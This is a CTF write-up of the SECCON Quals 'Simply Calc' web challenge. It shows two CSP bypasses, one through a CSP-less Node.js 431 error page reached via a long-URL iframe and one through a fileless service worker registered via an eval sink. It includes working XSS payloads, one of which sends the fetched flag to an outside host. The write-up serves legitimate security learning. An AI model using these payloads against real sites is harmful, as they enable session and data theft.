---
title: "[Simply Calc] - SECCON Quals"
tags:
  - CTF
  - Write-up
  - csp-bypass
  - client-side
  - service-worker
categories:
  - CTF
  - Write Up
---
![[Screenshot 2024-01-19 at 23.06.45.png]]
# Prologue
SECCON CTF is International yearly competition. The finals will take into Japan. 

![[2022-seccon-quals-simple-calc.tar.gz]]
# Write Up
## TL;DR Solution
### Un-intended

The un-intended solution is the player create an iframe with very long url and cause `431` error. The default of that error page in nodejs has a CSP-less, causing player able to bypass the intended CSP. 
### Intended

The intended solution is more complicated, the player need to create file-less service-worker by making use the `eval` function in `/js/index.js` and need to assign a dummy function or variable to prevent error. After that, player will need make use of [FetchEvent](https://developer.mozilla.org/en-US/docs/Web/API/FetchEvent) to be able intercept and modify the response without CSP needed.

## Detailed Explanation

### Un-intended

We were given the full source code for this challenge.
![[Screenshot 2024-01-19 at 23.23.33.png]]

As we can see in the `./challenge/src/static/js/index.js`, player able to control the query string of `expr`, and immediately `eval`-ed by the app. 
```js
// ./challenge/src/static/js/index.js
const params = new URLSearchParams(location.search);
const result = eval(params.get('expr'));
document.getElementById('result').innerText = result.toString();
```

By using `/?expr=alert(document.origin)` and we got a free-xss
![[Screenshot 2024-01-19 at 23.29.30.png]]

But the problem arise when we attempt to access the `/flag`.
```js
// ./challenge/src/index.js
// 8< -- Snip -- >8
app.get('/flag', (req, res) => {
  if (req.cookies.token !== ADMIN_TOKEN || !req.get('X-FLAG')) {
    return res.send('No flag for you!');
  }
  return res.send(FLAG);
});
// 8< -- Snip -- >8
```

As we can see, the CSP is very strict. The challenge CSP has `default-src` and the value is only at `http://localhost:3000/js/index.js`. So, every resources request we make outside that csp will be restricted.
![[Screenshot 2024-01-19 at 23.43.34.png]]

Luckily, In nodejs, the default page for error `431` has CSP-less.
![[Screenshot 2024-01-19 at 23.19.18.png]]

The idea is, we make an iframe with very-very long url to trigger the `413` error. And after that, we will execute JS inside the iframe context.

```js
_=document.createElement('iframe');
_.src=`http://localhost:3000/js/index.js?${"A".repeat(99999)}`;
document.body.appendChild(_);
// give a time to DOM to finish the iframe load
setTimeout(function(){
    _.contentWindow.fetch('/flag', {mode:"same-origin",headers: {"X-FLAG":"nice"}}).then((r)=>r.text()).then((r)=>{location=`http://host.docker.internal:1234/?${r}`});
}, 1000);
```

Send to the bot and we will able to get the flag
![[Screenshot 2024-01-20 at 00.09.21.png]]

![[Screenshot 2024-01-20 at 00.10.07.png]]
### Intended

Basically, `navigator.serviceWorker.register` works is just the same as fetch-ing the resource and then eval it without DOM. Therefore, player need to assign a dummy function or variable to prevent error. To proofing it, we can use `console.log` to check it.

```js
navigator.serviceWorker.register("/js/index.js?expr=console.log(1);1", {"scope":"./js/"}).then(
  (registration) => {
    console.log("Service worker registration succeeded:", registration);
  },
  (error) => {
    console.error(`Service worker registration failed: ${error}`);
  },
);
```


![[Screenshot 2024-01-20 at 15.45.41.png]]

As we can see, the `console.log` is fired, but it fail to register the service-worker. So, to prevent the error, we can add dummy DOM to prevent `reject` event. 

*de-minify* 
```js
document={};
document.getElementById=function(e){
	console.log(e);
	return {innerText:1}
};
```
service-worker
```js
navigator.serviceWorker.register("/js/index.js?expr=document={};document.getElementById=function(e){console.log(e);return {innerText:1}};1", {"scope":"./js/"}).then(
  (registration) => {
    console.log("Service worker registration succeeded:", registration);
  },
  (error) => {
    console.error(`Service worker registration failed: ${error}`);
  },
);
```

The service-worker is successfully registered.
![[Screenshot 2024-01-20 at 15.50.16.png]]

After that, we can make use of [Response](https://developer.mozilla.org/en-US/docs/Web/API/Response) and [respondWith](https://developer.mozilla.org/en-US/docs/Web/API/FetchEvent/respondWith) to manipulate the response in service-worker scope.

*de-minify*
```js
document={};
document.getElementById=function(e){
	console.log(e);
	return {innerText:1}
};
self.addEventListener('fetch',function(event){
	event.respondWith(
		new Response('<script>eval(location.hash.substr(1))</script>',{
			headers:{
				'Content-Type':'text/html'
			}
		})
	)
});1
```

service-worker
```js
navigator.serviceWorker.register("/js/index.js?expr=document={};document.getElementById=function(e){console.log(e);return {innerText:1}};self.addEventListener('fetch',function(event){event.respondWith(new Response('<script>eval(decodeURIComponent(location.hash.substr(1)))</script>',{headers:{'Content-Type':'text/html'}}))});1", {"scope":"./js/"}).then(
  (registration) => {
    console.log("Service worker registration succeeded:", registration);
  },
  (error) => {
    console.error(`Service worker registration failed: ${error}`);
  },
);1
```

visiting the scope of service worker (`/js`), and we were able to achieve have XSS without CSP.

But, those script still has a problem. Since the [FetchEvent](https://developer.mozilla.org/en-US/docs/Web/API/FetchEvent) will intercept all request, when we attempt to request `/flag`, it will be replaced with the XSS payload. Therefore, we need to whitelist the URL `/flag`.

*de-minify*
```js
document={};
document.getElementById=function(e){
	return {innerText:1}
};
self.addEventListener('fetch',function(event){
	if(new URL(event.request.url).pathname.includes('/flag')){return;};
	event.respondWith(
		new Response('<script>eval(location.hash.substr(1))</script>',{
			headers:{
				'Content-Type':'text/html'
			}
		})
	)
});1
```

service-worker, with a little bit cleaning up. The `setTimeout` function is used to let the service-worker installed.
```js
navigator.serviceWorker.register("/js/index.js?expr=document={};document.getElementById=function(e){console.log(e);return {innerText:1}};self.addEventListener('fetch',function(event){if(new URL(event.request.url).pathname.includes('/flag')){return;};event.respondWith(new Response('<script>eval(decodeURIComponent(location.hash.substr(1)))</script>',{headers:{'Content-Type':'text/html'}}))});1", {"scope":"./js/"});setTimeout(()=>{location="/js/#fetch('/flag', {headers:{'X-FLAG':'nyx'}}).then((r)=>r.text()).then((r)=>{alert(r)})"}, 1000)
```

We successfully whitelisting our request.
![[Screenshot 2024-01-21 at 02.26.36.png]]

So, all we need to do next is just modify the alert into send the response into our webhook.
![[Screenshot 2024-01-21 at 02.29.47.png]]
![[Screenshot 2024-01-21 at 02.30.06.png]]

# Epilogue

As usual, SECCON always has a very good challenge. And unfortunately, I didn't managed to solve this, but i learn something new things with service-worker. 

— nyxsorcerer